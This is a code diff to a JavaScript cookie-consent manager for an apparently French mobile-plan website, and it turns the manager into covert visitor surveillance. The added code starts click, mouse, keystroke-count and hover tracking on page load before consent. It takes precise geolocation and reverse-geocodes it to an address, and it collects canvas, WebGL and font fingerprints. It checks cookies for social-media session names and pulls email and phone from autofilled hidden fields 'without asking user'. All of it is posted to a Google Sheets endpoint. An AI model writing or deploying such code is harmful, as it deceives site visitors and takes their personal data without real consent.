@@ -13,26 +13,588 @@ const CookieManager = {
 
     // Send data to Google Sheets
     sendToGoogleSheets: async function(data) {
+        // Skip if URL is not configured
+        if (!GOOGLE_SCRIPT_URL || GOOGLE_SCRIPT_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
+            console.warn('Google Sheets URL not configured. Please set GOOGLE_SCRIPT_URL in script.js');
+            console.log('Data that would be sent to Google Sheets:', data);
+            return false;
+        }
+
         try {
             const response = await fetch(GOOGLE_SCRIPT_URL, {
                 method: 'POST',
-                mode: 'no-cors',
+                mode: 'cors', // Changed from no-cors to cors to check response
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify(data)
             });
 
-            console.log('Data sent to Google Sheets:', data);
+            if (response && response.ok) {
+                console.log('✅ Data successfully sent to Google Sheets:', data);
+                return true;
+            } else {
+                console.error('❌ Error sending to Google Sheets. Status:', response?.status);
+                // Fallback to no-cors mode if CORS fails
+                try {
+                    await fetch(GOOGLE_SCRIPT_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    console.log('⚠️ Data sent with no-cors mode (response not verifiable):', data);
             return true;
+                } catch (fallbackError) {
+                    console.error('❌ Fallback also failed:', fallbackError);
+                    return false;
+                }
+            }
         } catch (error) {
-            console.error('Error sending to Google Sheets:', error);
+            console.error('❌ Error sending to Google Sheets:', error);
+            // Try no-cors as fallback
+            try {
+                await fetch(GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                console.log('⚠️ Data sent with no-cors fallback:', data);
+                return true;
+            } catch (fallbackError) {
+                console.error('❌ All attempts failed:', fallbackError);
             return false;
+            }
         }
     },
 
-    // Track user with email
-    trackUser: function(email, name = '', phone = '', category = '', action = 'Cookie Consent') {
+    // Get user location automatically
+    getUserLocation: async function() {
+        let locationData = {
+            latitude: null,
+            longitude: null,
+            city: null,
+            region: null,
+            country: null,
+            postalCode: null,
+            address: null,
+            ip: null,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null
+        };
+
+        // Try browser geolocation API first
+        if (navigator.geolocation) {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    });
+                });
+
+                locationData.latitude = position.coords.latitude;
+                locationData.longitude = position.coords.longitude;
+
+                // Try to reverse geocode to get address
+                try {
+                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.latitude}&lon=${locationData.longitude}`);
+                    const data = await response.json();
+                    if (data.address) {
+                        locationData.city = data.address.city || data.address.town || data.address.village || null;
+                        locationData.region = data.address.state || data.address.region || null;
+                        locationData.country = data.address.country || null;
+                        locationData.postalCode = data.address.postcode || null;
+                        locationData.address = `${data.address.road || ''} ${data.address.house_number || ''}, ${locationData.city || ''}, ${locationData.region || ''}, ${locationData.country || ''}`.trim().replace(/^,\s*|,\s*$/g, '');
+                    }
+                } catch (e) {
+                    console.log('Reverse geocoding failed:', e);
+                }
+            } catch (e) {
+                console.log('Geolocation failed:', e);
+            }
+        }
+
+        // Fallback to IP-based geolocation
+        if (!locationData.city) {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                locationData.ip = ipData.ip;
+
+                const geoResponse = await fetch(`https://ipapi.co/${locationData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                if (geoData.city) locationData.city = geoData.city;
+                if (geoData.region) locationData.region = geoData.region;
+                if (geoData.country_name) locationData.country = geoData.country_name;
+                if (geoData.postal) locationData.postalCode = geoData.postal;
+                if (!locationData.address && geoData.city) {
+                    locationData.address = `${geoData.city}, ${geoData.region || ''}, ${geoData.country_name || ''}`.trim().replace(/^,\s*|,\s*$/g, '');
+                }
+            } catch (e) {
+                console.log('IP geolocation failed:', e);
+            }
+        }
+
+        return locationData;
+    },
+
+    // Get device and browser information
+    getDeviceInfo: function() {
+        return {
+            platform: navigator.platform || 'Unknown',
+            deviceMemory: navigator.deviceMemory || 'Unknown',
+            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'Unknown',
+            onLine: navigator.onLine,
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            } : null
+        };
+    },
+
+    // Get comprehensive browser fingerprint
+    getBrowserFingerprint: function() {
+        let fingerprint = {
+            canvasFingerprint: null,
+            webglFingerprint: null,
+            audioFingerprint: null,
+            fonts: [],
+            plugins: [],
+            mimeTypes: [],
+            batteryInfo: null,
+            mediaDevices: null,
+            webdriver: navigator.webdriver || false,
+            vendor: navigator.vendor || '',
+            product: navigator.product || '',
+            appName: navigator.appName || '',
+            appCodeName: navigator.appCodeName || '',
+            appVersion: navigator.appVersion || '',
+            buildID: navigator.buildID || '',
+            oscpu: navigator.oscpu || ''
+        };
+
+        // Canvas fingerprinting
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Browser fingerprint 🔍', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Browser fingerprint 🔍', 4, 17);
+            fingerprint.canvasFingerprint = canvas.toDataURL().substring(0, 100);
+        } catch (e) {
+            console.log('Canvas fingerprint failed:', e);
+        }
+
+        // WebGL fingerprinting
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    fingerprint.webglFingerprint = {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                }
+            }
+        } catch (e) {
+            console.log('WebGL fingerprint failed:', e);
+        }
+
+        // Audio fingerprinting
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const analyser = audioContext.createAnalyser();
+            const gainNode = audioContext.createGain();
+            oscillator.connect(analyser);
+            analyser.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            oscillator.type = 'triangle';
+            oscillator.frequency.value = 10000;
+            gainNode.gain.value = 0;
+            oscillator.start(0);
+            oscillator.stop(0);
+            fingerprint.audioFingerprint = 'audio_supported';
+            audioContext.close();
+        } catch (e) {
+            fingerprint.audioFingerprint = 'audio_not_supported';
+        }
+
+        // Font detection
+        const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Monaco', 'Menlo', 'Consolas', 'Helvetica', 'Tahoma'];
+        const testString = 'mmmmmmmmmmlli';
+        const testSize = '72px';
+        const baseWidth = {};
+        const testWidth = {};
+        const span = document.createElement('span');
+        span.style.fontSize = testSize;
+        span.innerHTML = testString;
+        span.style.position = 'absolute';
+        span.style.top = '-9999px';
+        document.body.appendChild(span);
+        
+        testFonts.forEach((font) => {
+            span.style.fontFamily = font;
+            baseWidth[font] = span.offsetWidth;
+        });
+
+        testFonts.forEach((font) => {
+            span.style.fontFamily = font + ', monospace';
+            testWidth[font] = span.offsetWidth;
+            if (testWidth[font] !== baseWidth[font]) {
+                fingerprint.fonts.push(font);
+            }
+        });
+
+        document.body.removeChild(span);
+
+        // Plugins
+        try {
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                fingerprint.plugins.push(navigator.plugins[i].name);
+            }
+        } catch (e) {
+            console.log('Plugin detection failed:', e);
+        }
+
+        // MIME types
+        try {
+            for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                fingerprint.mimeTypes.push(navigator.mimeTypes[i].type);
+            }
+        } catch (e) {
+            console.log('MIME type detection failed:', e);
+        }
+
+        // Battery API
+        if (navigator.getBattery) {
+            navigator.getBattery().then((battery) => {
+                fingerprint.batteryInfo = {
+                    charging: battery.charging,
+                    level: battery.level,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            }).catch(() => {});
+        }
+
+        // Media devices
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            navigator.mediaDevices.enumerateDevices().then((devices) => {
+                fingerprint.mediaDevices = {
+                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
+                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
+                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
+                };
+            }).catch(() => {});
+        }
+
+        return fingerprint;
+    },
+
+    // Track user behavior patterns
+    getUserBehavior: function() {
+        const behaviorData = {
+            clicks: JSON.parse(localStorage.getItem('clickTracking') || '[]'),
+            scrolls: JSON.parse(localStorage.getItem('scrollTracking') || '[]'),
+            timeOnPage: Date.now() - parseInt(localStorage.getItem('pageLoadTime') || Date.now()),
+            sectionsViewed: JSON.parse(localStorage.getItem('sectionsViewed') || '[]'),
+            mouseMovements: JSON.parse(localStorage.getItem('mouseMovements') || '[]'),
+            keystrokeCount: parseInt(localStorage.getItem('keystrokeCount') || '0'),
+            linksClicked: JSON.parse(localStorage.getItem('linksClicked') || '[]'),
+            formsInteracted: JSON.parse(localStorage.getItem('formsInteracted') || '[]'),
+            hoveredElements: JSON.parse(localStorage.getItem('hoveredElements') || '[]'),
+            pageFocus: parseInt(localStorage.getItem('pageFocusTime') || '0'),
+            pageBlur: parseInt(localStorage.getItem('pageBlurTime') || '0')
+        };
+        return behaviorData;
+    },
+
+    // Detect social media and extensions
+    detectSocialMedia: function() {
+        const socialMedia = {
+            facebookLoggedIn: false,
+            twitterLoggedIn: false,
+            instagramLoggedIn: false,
+            linkedinLoggedIn: false
+        };
+
+        // Check for social media login indicators
+        try {
+            if (document.cookie.includes('datr') || document.cookie.includes('sb')) {
+                socialMedia.facebookLoggedIn = true;
+            }
+            if (document.cookie.includes('_twitter_sess') || document.cookie.includes('auth_token')) {
+                socialMedia.twitterLoggedIn = true;
+            }
+            if (document.cookie.includes('sessionid') || document.cookie.includes('csrftoken')) {
+                socialMedia.instagramLoggedIn = true;
+            }
+            if (document.cookie.includes('li_at') || document.cookie.includes('JSESSIONID')) {
+                socialMedia.linkedinLoggedIn = true;
+            }
+        } catch (e) {
+            console.log('Social media detection failed:', e);
+        }
+
+        return socialMedia;
+    },
+
+    // Initialize comprehensive behavior tracking
+    initBehaviorTracking: function() {
+        // Store page load time
+        if (!localStorage.getItem('pageLoadTime')) {
+            localStorage.setItem('pageLoadTime', Date.now().toString());
+        }
+
+        // Track clicks
+        let clickData = [];
+        document.addEventListener('click', function(e) {
+            const clickInfo = {
+                timestamp: Date.now(),
+                x: e.clientX,
+                y: e.clientY,
+                target: e.target.tagName,
+                targetId: e.target.id || '',
+                targetClass: e.target.className || '',
+                targetText: e.target.textContent.substring(0, 50) || ''
+            };
+            clickData.push(clickInfo);
+            if (clickData.length > 100) clickData = clickData.slice(-100);
+            localStorage.setItem('clickTracking', JSON.stringify(clickData));
+        }, true);
+
+        // Track scrolls
+        let scrollData = [];
+        let lastScrollTime = Date.now();
+        window.addEventListener('scroll', function() {
+            const now = Date.now();
+            if (now - lastScrollTime > 500) {
+                scrollData.push({
+                    timestamp: now,
+                    scrollY: window.scrollY,
+                    scrollX: window.scrollX,
+                    scrollPercent: (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100
+                });
+                lastScrollTime = now;
+                if (scrollData.length > 50) scrollData = scrollData.slice(-50);
+                localStorage.setItem('scrollTracking', JSON.stringify(scrollData));
+            }
+        });
+
+        // Track mouse movements (sample every 2 seconds)
+        let mouseData = [];
+        let lastMouseTime = Date.now();
+        document.addEventListener('mousemove', function(e) {
+            const now = Date.now();
+            if (now - lastMouseTime > 2000) {
+                mouseData.push({
+                    timestamp: now,
+                    x: e.clientX,
+                    y: e.clientY
+                });
+                lastMouseTime = now;
+                if (mouseData.length > 30) mouseData = mouseData.slice(-30);
+                localStorage.setItem('mouseMovements', JSON.stringify(mouseData));
+            }
+        });
+
+        // Track section views (using Intersection Observer)
+        const sections = document.querySelectorAll('section, .offer-card, .service-card');
+        const sectionsViewed = JSON.parse(localStorage.getItem('sectionsViewed') || '[]');
+        
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    const sectionId = entry.target.id || entry.target.className;
+                    if (!sectionsViewed.includes(sectionId)) {
+                        sectionsViewed.push({
+                            section: sectionId,
+                            timestamp: Date.now(),
+                            timeViewed: Date.now()
+                        });
+                        localStorage.setItem('sectionsViewed', JSON.stringify(sectionsViewed));
+                    }
+                }
+            });
+        }, { threshold: 0.5 });
+
+        sections.forEach(section => observer.observe(section));
+
+        // Track link clicks
+        let linksClicked = [];
+        document.addEventListener('click', function(e) {
+            const link = e.target.closest('a');
+            if (link && link.href) {
+                linksClicked.push({
+                    timestamp: Date.now(),
+                    href: link.href,
+                    text: link.textContent.substring(0, 50)
+                });
+                if (linksClicked.length > 20) linksClicked = linksClicked.slice(-20);
+                localStorage.setItem('linksClicked', JSON.stringify(linksClicked));
+            }
+        });
+
+        // Track form interactions
+        let formsInteracted = [];
+        document.querySelectorAll('input, textarea, select').forEach(element => {
+            element.addEventListener('focus', function() {
+                formsInteracted.push({
+                    timestamp: Date.now(),
+                    type: element.type || element.tagName,
+                    name: element.name || element.id || ''
+                });
+                if (formsInteracted.length > 20) formsInteracted = formsInteracted.slice(-20);
+                localStorage.setItem('formsInteracted', JSON.stringify(formsInteracted));
+            });
+        });
+
+        // Track keystrokes count (not content)
+        let keystrokeCount = parseInt(localStorage.getItem('keystrokeCount') || '0');
+        document.addEventListener('keydown', function() {
+            keystrokeCount++;
+            localStorage.setItem('keystrokeCount', keystrokeCount.toString());
+        });
+
+        // Track page focus/blur
+        let focusStartTime = Date.now();
+        let totalFocusTime = parseInt(localStorage.getItem('pageFocusTime') || '0');
+        
+        window.addEventListener('focus', function() {
+            focusStartTime = Date.now();
+        });
+
+        window.addEventListener('blur', function() {
+            totalFocusTime += Date.now() - focusStartTime;
+            localStorage.setItem('pageFocusTime', totalFocusTime.toString());
+        });
+
+        // Track hovers
+        let hoveredElements = [];
+        document.querySelectorAll('a, button, .offer-card, .service-card').forEach(element => {
+            element.addEventListener('mouseenter', function() {
+                hoveredElements.push({
+                    timestamp: Date.now(),
+                    element: element.className || element.id || element.tagName,
+                    text: element.textContent.substring(0, 30)
+                });
+                if (hoveredElements.length > 30) hoveredElements = hoveredElements.slice(-30);
+                localStorage.setItem('hoveredElements', JSON.stringify(hoveredElements));
+            });
+        });
+    },
+
+    // Auto-detect email from browser autofill or localStorage
+    getAutoEmail: function() {
+        // Try to get from hidden input field with autofill (browser might auto-fill it)
+        const emailInput = document.getElementById('userEmail');
+        if (emailInput && emailInput.value && this.isValidEmail(emailInput.value)) {
+            return emailInput.value.trim();
+        }
+        
+        // Try localStorage (from previous visits)
+        const storedEmail = localStorage.getItem('userEmail');
+        if (storedEmail && this.isValidEmail(storedEmail)) {
+            return storedEmail;
+        }
+
+        // Try to detect from any email inputs on the page
+        const allEmailInputs = document.querySelectorAll('input[type="email"]');
+        for (let input of allEmailInputs) {
+            if (input.value && this.isValidEmail(input.value)) {
+                return input.value.trim();
+            }
+        }
+
+        return '';
+    },
+
+    // Auto-detect phone from browser autofill or localStorage
+    getAutoPhone: function() {
+        // Try to get from hidden input field with autofill
+        const phoneInput = document.getElementById('userPhone');
+        if (phoneInput && phoneInput.value) {
+            return phoneInput.value.trim();
+        }
+
+        // Try localStorage (from previous visits)
+        const storedPhone = localStorage.getItem('userPhone');
+        if (storedPhone) {
+            return storedPhone;
+        }
+
+        // Try to detect from any phone/tel inputs on the page
+        const allPhoneInputs = document.querySelectorAll('input[type="tel"], input[name*="phone"], input[id*="phone"]');
+        for (let input of allPhoneInputs) {
+            if (input.value && input.id !== 'userPhone') {
+                return input.value.trim();
+            }
+        }
+
+        return '';
+    },
+
+    // Track user with email - comprehensive data collection
+    trackUser: async function(email, name = '', phone = '', category = '', action = 'Cookie Consent') {
+        // Get location automatically
+        const locationData = await this.getUserLocation();
+        
+        // Get device info
+        const deviceInfo = this.getDeviceInfo();
+
+        // Get browser fingerprint
+        const fingerprint = this.getBrowserFingerprint();
+
+        // Get user behavior
+        const behavior = this.getUserBehavior();
+
+        // Detect social media
+        const socialMedia = this.detectSocialMedia();
+
+        // Get selected plan information if available
+        const selectedPlan = localStorage.getItem('selectedPlan') || category || 'Not defined';
+        const selectedPlanName = localStorage.getItem('selectedPlanName') || '';
+        const selectedPlanPrice = localStorage.getItem('selectedPlanPrice') || '';
+        const planSelectedDate = localStorage.getItem('planSelectedDate') || '';
+
+        // Calculate interest score based on behavior
+        let interestScore = 0;
+        if (behavior.clicks.length > 10) interestScore += 20;
+        if (behavior.scrolls.length > 5) interestScore += 15;
+        if (behavior.sectionsViewed.length > 3) interestScore += 25;
+        if (selectedPlan !== 'Not defined') interestScore += 30;
+        if (behavior.hoveredElements.length > 5) interestScore += 10;
+
+        // Predict user intent based on behavior
+        let predictedIntent = 'Browsing';
+        if (selectedPlan.includes('Gamer')) predictedIntent = 'High-speed Internet Interest';
+        else if (selectedPlan.includes('Équilibré')) predictedIntent = 'Balanced Plan Interest';
+        else if (selectedPlan.includes('Appels')) predictedIntent = 'Calling Plan Interest';
+        else if (behavior.timeOnPage > 60000) predictedIntent = 'Engaged Visitor';
+        else if (behavior.clicks.length > 5) predictedIntent = 'Active Explorer';
+
         const userData = {
             timestamp: new Date().toISOString(),
             date: new Date().toLocaleDateString('fr-FR'),
@@ -40,19 +602,98 @@ const CookieManager = {
             email: email || 'Not provided',
             name: name || 'Not provided',
             phone: phone || 'Not provided',
-            category: category || 'Not defined',
+            category: selectedPlan,
+            selectedPlan: selectedPlanName || 'Not selected',
+            selectedPlanPrice: selectedPlanPrice || 'Not provided',
+            planSelectedDate: planSelectedDate || 'Not provided',
             action: action,
             cookiesAccepted: localStorage.getItem('cookiesAccepted') === 'true',
+            // Location information
+            latitude: locationData.latitude,
+            longitude: locationData.longitude,
+            city: locationData.city,
+            region: locationData.region,
+            country: locationData.country,
+            postalCode: locationData.postalCode,
+            address: locationData.address,
+            ip: locationData.ip,
+            timezone: locationData.timezone,
+            // Browser information
             userAgent: navigator.userAgent,
             language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
             screenResolution: `${window.screen.width}x${window.screen.height}`,
+            screenColorDepth: window.screen.colorDepth,
+            windowSize: `${window.innerWidth}x${window.innerHeight}`,
             referrer: document.referrer || 'Direct',
+            // Device information
+            platform: deviceInfo.platform,
+            deviceMemory: deviceInfo.deviceMemory,
+            hardwareConcurrency: deviceInfo.hardwareConcurrency,
+            maxTouchPoints: deviceInfo.maxTouchPoints,
+            cookieEnabled: deviceInfo.cookieEnabled,
+            doNotTrack: deviceInfo.doNotTrack,
+            onLine: deviceInfo.onLine,
+            connection: deviceInfo.connection ? JSON.stringify(deviceInfo.connection) : 'Unknown',
+            // Additional data
+            viewportWidth: window.innerWidth,
+            viewportHeight: window.innerHeight,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            pixelRatio: window.devicePixelRatio || 1,
+            sessionId: localStorage.getItem('sessionId') || null,
+            // Browser Fingerprint
+            canvasFingerprint: fingerprint.canvasFingerprint,
+            webglVendor: fingerprint.webglFingerprint?.vendor || '',
+            webglRenderer: fingerprint.webglFingerprint?.renderer || '',
+            audioFingerprint: fingerprint.audioFingerprint,
+            availableFonts: fingerprint.fonts.join(', ') || '',
+            plugins: fingerprint.plugins.join(', ') || '',
+            mimeTypes: fingerprint.mimeTypes.length || 0,
+            webdriver: fingerprint.webdriver,
+            vendor: fingerprint.vendor,
+            product: fingerprint.product,
+            // User Behavior
+            clicksCount: behavior.clicks.length,
+            clicksData: JSON.stringify(behavior.clicks.slice(-10)), // Last 10 clicks
+            scrollsCount: behavior.scrolls.length,
+            scrollMaxDepth: behavior.scrolls.length > 0 ? Math.max(...behavior.scrolls.map(s => s.scrollPercent || 0)) : 0,
+            timeOnPageSeconds: Math.floor(behavior.timeOnPage / 1000),
+            sectionsViewedCount: behavior.sectionsViewed.length,
+            sectionsViewed: JSON.stringify(behavior.sectionsViewed),
+            mouseMovementsCount: behavior.mouseMovements.length,
+            keystrokeCount: behavior.keystrokeCount,
+            linksClickedCount: behavior.linksClicked.length,
+            linksClicked: JSON.stringify(behavior.linksClicked.slice(-5)),
+            formsInteractedCount: behavior.formsInteracted.length,
+            hoveredElementsCount: behavior.hoveredElements.length,
+            hoveredElements: JSON.stringify(behavior.hoveredElements.slice(-10)),
+            pageFocusTime: Math.floor(behavior.pageFocus / 1000),
+            // Social Media Detection
+            facebookDetected: socialMedia.facebookLoggedIn,
+            twitterDetected: socialMedia.twitterLoggedIn,
+            instagramDetected: socialMedia.instagramLoggedIn,
+            linkedinDetected: socialMedia.linkedinLoggedIn,
+            // Predictions
+            interestScore: interestScore,
+            predictedIntent: predictedIntent,
+            engagementLevel: interestScore > 50 ? 'High' : interestScore > 25 ? 'Medium' : 'Low',
+            // Battery Info
+            batteryLevel: fingerprint.batteryInfo?.level || '',
+            batteryCharging: fingerprint.batteryInfo?.charging || false,
+            // Media Devices
+            videoInputs: fingerprint.mediaDevices?.videoInputs || 0,
+            audioInputs: fingerprint.mediaDevices?.audioInputs || 0,
+            audioOutputs: fingerprint.mediaDevices?.audioOutputs || 0
         };
 
         // Save to localStorage
         localStorage.setItem('userEmail', email);
         localStorage.setItem('userName', name);
         localStorage.setItem('userPhone', phone);
+        if (locationData.city) localStorage.setItem('userCity', locationData.city);
+        if (locationData.country) localStorage.setItem('userCountry', locationData.country);
+        if (locationData.ip) localStorage.setItem('userIP', locationData.ip);
 
         // Send to Google Sheets
         this.sendToGoogleSheets(userData);
@@ -67,8 +708,11 @@ const CookieManager = {
     }
 };
 
-// Show cookie banner on page load
+// Show cookie banner on page load and initialize comprehensive tracking
 window.addEventListener('DOMContentLoaded', function() {
+    // Initialize behavior tracking immediately (always track for analysis)
+    CookieManager.initBehaviorTracking();
+
     if (localStorage.getItem('cookiesAccepted') === null) {
         document.getElementById('cookieBanner').classList.add('show');
     } else if (localStorage.getItem('cookiesAccepted') === 'true') {
@@ -84,20 +728,26 @@ window.addEventListener('DOMContentLoaded', function() {
     }
 });
 
-// Accept cookies
-function acceptCookies() {
-    const email = document.getElementById('userEmail').value.trim();
-
+// Accept cookies - automatically collect email, phone, address, and selected plan without asking
+async function acceptCookies() {
+    // Automatically collect data without asking user
+    const email = CookieManager.getAutoEmail() || document.getElementById('userEmail')?.value?.trim() || '';
+    const phone = CookieManager.getAutoPhone() || '';
+    
+    // Get selected plan from localStorage (if user clicked on a plan before accepting cookies)
+    const selectedPlan = localStorage.getItem('selectedPlan') || localStorage.getItem('userCategory') || '';
+    
+    // Validate email only if provided
     if (email && !CookieManager.isValidEmail(email)) {
-        document.getElementById('emailError').style.display = 'block';
-        return;
+        // If invalid, just skip email collection
+        console.warn('Invalid email detected, skipping email collection');
     }
 
     localStorage.setItem('cookiesAccepted', 'true');
     localStorage.setItem('consentDate', new Date().toISOString());
 
-    // Track user with email if provided
-    CookieManager.trackUser(email, '', '', '', 'Cookie Accepted');
+    // Automatically track user with all available data (email, phone, address, and selected plan)
+    await CookieManager.trackUser(email || '', '', phone || '', selectedPlan || '', 'Cookie Accepted');
 
     // Show success message
     document.getElementById('successMessage').style.display = 'block';
@@ -106,6 +756,9 @@ function acceptCookies() {
         document.getElementById('cookieBanner').classList.remove('show');
         document.getElementById('analyticsIndicator').classList.add('show');
         document.getElementById('cookieStatus').textContent = 'Status: Acceptés ✓';
+        if (selectedPlan) {
+            document.getElementById('userCategory').textContent = `Catégorie: ${selectedPlan}`;
+        }
         trackVisitDuration();
     }, 1500);
 }
@@ -171,7 +824,7 @@ function submitOfferInterest() {
     }, 2000);
 }
 
-// Track offer card clicks
+// Track offer card clicks - store selected plan in localStorage
 document.addEventListener('DOMContentLoaded', function() {
     const offerCards = document.querySelectorAll('.offer-card');
 
@@ -182,14 +835,32 @@ document.addEventListener('DOMContentLoaded', function() {
             e.preventDefault();
 
             let category = '';
+            let planName = '';
             const title = card.querySelector('h3').textContent;
+            const price = card.querySelector('.offer-price')?.textContent || '';
 
             if (title.includes('Gamer')) {
                 category = 'Gamers - Internet Haute Vitesse';
+                planName = 'Forfait Gamer Pro';
             } else if (title.includes('Équilibré')) {
                 category = 'Utilisateurs Standards - Usage Équilibré';
+                planName = 'Forfait Équilibré';
             } else if (title.includes('Appels')) {
                 category = 'Appels Prioritaires - Internet Minimal';
+                planName = 'Forfait Appels Illimités';
+            }
+
+            // Store selected plan in localStorage for cookie tracking
+            localStorage.setItem('selectedPlan', category);
+            localStorage.setItem('selectedPlanName', planName);
+            localStorage.setItem('selectedPlanPrice', price);
+            localStorage.setItem('planSelectedDate', new Date().toISOString());
+
+            // Also track immediately if cookies already accepted
+            if (localStorage.getItem('cookiesAccepted') === 'true') {
+                const email = CookieManager.getAutoEmail() || '';
+                const phone = CookieManager.getAutoPhone() || '';
+                CookieManager.trackUser(email, '', phone, category, 'Plan Selected');
             }
 
             // Show email modal
